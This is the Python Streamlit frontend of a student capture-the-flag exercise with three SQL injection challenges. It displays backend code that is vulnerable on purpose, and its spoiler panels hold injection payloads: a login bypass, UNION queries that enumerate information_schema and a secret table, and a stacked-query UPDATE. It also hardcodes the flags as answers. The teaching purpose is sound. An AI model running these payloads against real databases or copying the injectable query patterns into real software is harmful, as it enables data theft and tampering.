# streamlit run app.py

import streamlit as st
import requests
import pandas as pd
import json
from streamlit_tags import st_tags

SERVER = 'http://127.0.0.1:8000/'
COMMENT_TEMPLATE_MD = """{}: {}
> {}"""

hide_streamlit_style = """
            <style>
            footer {visibility: hidden;}
            </style>
            """
st.markdown(hide_streamlit_style, unsafe_allow_html=True)


## SIDEBAR ##
with st.sidebar:
    flags = 0
    flag_progress = 0

    st.markdown('# COMP6441')
    st.text(
        'Something Awesome Project \nBy: Jonathan Tea z5146699 \nDate: November 2023')
    st.markdown('## CTF Challenges')

    progress_container = st.container()

    st.text_area(label="Challenge 1:",
                 value="The goal is to find the secret user. \n\nhint: Try using the following credentials to view the welcome message. \n\nusername: alice \npassword: pass123", disabled=True, height=200)

    flag1 = st.text_input('Flag 1: Secret Username',
                          placeholder="Username...")

    st.divider()
    st.text_area(label="Challenge 2:",
                 value="On the map is the location of your friends Amy, Scott and Jerry. Find the location of the secret user. \n\nhint: You dont know their username.", disabled=True, height=200)

    flag2 = st.text_input('Flag 2: Secret Location',
                          placeholder="Suburb...")

    st.divider()
    st.text_area(label="Challenge 3:",
                 value="Your goal is to remove the hamburger emoji from the title. When this is done, a secret message will be revealed in the body of the blog post.", disabled=True, height=200)

    flag3 = st.text_input('Flag 3: Secret Message',
                          placeholder="Message...")

    with progress_container:
        if flag1 == "SECRET_USR_CHATG05":
            flags += 1
            flag_progress += 33
        if flag2.lower() == "centennial park":
            flags += 1
            flag_progress += 33
        if flag3.lower() == "hamburglar_was_here":
            flags += 1
            flag_progress += 34
        finish_container = st.container()
        st.progress(flag_progress, f"Flags Captured {flags}/3 🚩")
        if flag_progress >= 100:
            with finish_container:
                st.success("Congratulations! All CTF's Captured!")
            st.balloons()


## CHALLENGE 1 COMPONENTS ##
def challenge_1():
    st.header('Login')
    output = st.container()

    with st.form(key='my_form'):
        username = st.text_input('Username')
        password = st.text_input('Password', type='password')
        submitted = st.form_submit_button('Login')
        if username and password and submitted:
            data = {"username": username, "password": password}
            request = requests.post(SERVER+'login', json=data)
            with output:
                if request.text == "[]":
                    st.error("Username or password is invalid!")
                else:
                    st.success(f"Succesfully signed in!")
                    st.info(f"Welcome {request.text}!")

    with st.expander(label="Backend Code"):
        code = '''
        @app.post("/login")
        async def login(request: Request):
        data = await request.json()
        username = data['username']
        password = data['password']
        return make_query(f"SELECT username from users where username='{username}' and password='{password}';")
        '''
        st.code(code, language='python')

    with st.expander(label="Reveal Query - Spoiler!"):
        st.text("' or 1=1; --x")

    with st.expander(label="Reveal Flag - Spoiler!"):
        st.text("SECRET_USR_CHATG05")


## CHALLENGE 2 COMPONENTS ##
def challenge_2():
    st.header("Maps")
    map_container = st.container()

    # get input data
    names = st_tags(value=['Amy', 'Scott', 'Jerry'],
                    suggestions=[4, 5, 6], label='Filter Users:')
    data = {"names": names}

    # use input table to mak request
    request = requests.post(SERVER+'locations', json=data)
    payload = json.loads(request.text)

    if payload:
        # render locations table and map
        payload_df = pd.DataFrame(
            payload, columns=["Name", "Latitude", "Longitude"], index=range(1, len(payload) + 1))
        st.dataframe(payload_df, use_container_width=True)
        coords = [[x[1], x[2]] for x in payload]
        df = pd.DataFrame(coords, columns=['lat', 'lon'])
        with map_container:
            st.map(df, use_container_width=False)
    else:
        # render empty map
        with map_container:
            st.map(use_container_width=False)

    # reveal backend code expander
    with st.expander(label="Backend Code"):
        code = '''
            @app.post("/locations")
            async def locations(request: Request):
            data = await request.json()
            # names = ('Amy', 'Scott', 'Jerry')
            names = "(" + ", ".join(f"'{name}'" for name in data['names']) + ")"
            return make_query(f"SELECT name, lat, lon FROM locations WHERE name IN {names}")
            '''
        st.code(code, language='python')

    # reveal spoler expander
    with st.expander(label="Reveal Query - Spoiler!"):
        st.text(
            "' ) UNION ALL SELECT table_name, 0, 0 FROM information_schema.tables; --x")
        st.text(
            "' ) UNION Select table_name, 1, 1 from information_schema.columns WHERE column_name = 'lat'; --x")
        st.text("' ) UNION ALL SELECT name, lat, lon FROM secret_locations; --x")

    # reveal flag expander
    with st.expander(label="Reveal Flag - Spoiler!"):
        st.text("CENTENNIAL PARK")


## CHALLENGE 3 COMPONENTS ##
def challenge_3():
    st.header("Blog Post")
    comments = blog()
    display_comments(comments)

    # backend code expander
    with st.expander(label="Backend Code"):
        code = '''
            @app.post("/comment")
            async def comment(request: Request):
                data = await request.json()
                date = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
                data['date'] = date
                existing_comments = json.dumps(get_comments())[:-1]
                new_comment = f', {{"name": "{data["name"]}", "date": "{data["date"]}", "comment": "{data["comment"]}"}}'
                # query = f"UPDATE blog SET comments = '[{comments}]'::jsonb WHERE blog_id = 1;"
                query = f"UPDATE blog SET comments = '{existing_comments + new_comment}]'::jsonb WHERE blog_id = 1;"
                make_query(query, is_select=False)
                return "Comment added successfully"
            '''
        st.code(code, language='python')

    # reveal query expander
    with st.expander(label="Reveal Query - Spoiler!"):
        st.text(
            """"}]'::jsonb WHERE blog_id =1; UPDATE blog Set blog_title = 'Craving a Hamburger' where blog_id = 1; --x""")

    # reveal flag expander
    with st.expander(label="Reveal Flag - Spoiler!"):
        st.text("HAMBURGLAR_WAS_HERE")


def blog():
    """ helper function for challenge 3 - blog details """
    request = requests.get(SERVER+'blog')
    blog = json.loads(request.content)[0]
    id, title, body, comments = blog
    st.markdown(f"""# {title}""")
    st.markdown(
        f"""<small><small>blog id: {id}<small>""", unsafe_allow_html=True)
    # reveal secrete if hamburger emoji is not in the blog's title
    if '🍔' not in title:
        st.markdown("HAMBURGLAR_WAS_HERE")
    else:
        st.markdown(f"""{body}""")
    return comments


def display_comments(comments):
    """ helper function for challenge 3 - blog comments """
    st.divider()
    with st.container():
        # show comments
        st.markdown(f"""### {len(comments)} Comments:""")

        for index, entry in enumerate(comments):
            st.markdown(COMMENT_TEMPLATE_MD.format(
                entry['name'], entry['date'], entry['comment']))
            is_last = index == len(comments) - 1
            is_new = "just_posted" in st.session_state and is_last
            if is_new:
                st.success("☝️ Your comment was successfully posted.")
                del st.session_state['just_posted']

        # insert comment
        st.write("**Add your own comment:**")
        form = st.form("comment")
        name = form.text_input("Name", value="Hamburglar", disabled=True)
        comment = form.text_area("Comment")
        submit = form.form_submit_button("Add comment")

        if submit:
            data = {"name": name, "comment": comment}
            requests.post(SERVER+'comment', json=data)
            if "just_posted" not in st.session_state:
                st.session_state["just_posted"] = True
            st.experimental_rerun()


## TAB MENU ##
t1, t2, t3, t4 = st.tabs(["1", "2", "3", "Scratchpad"])
with t1:
    challenge_1()
with t2:
    challenge_2()
with t3:
    challenge_3()
with t4:
    scratchpad = st.text_area("Scratchpad", height=300)
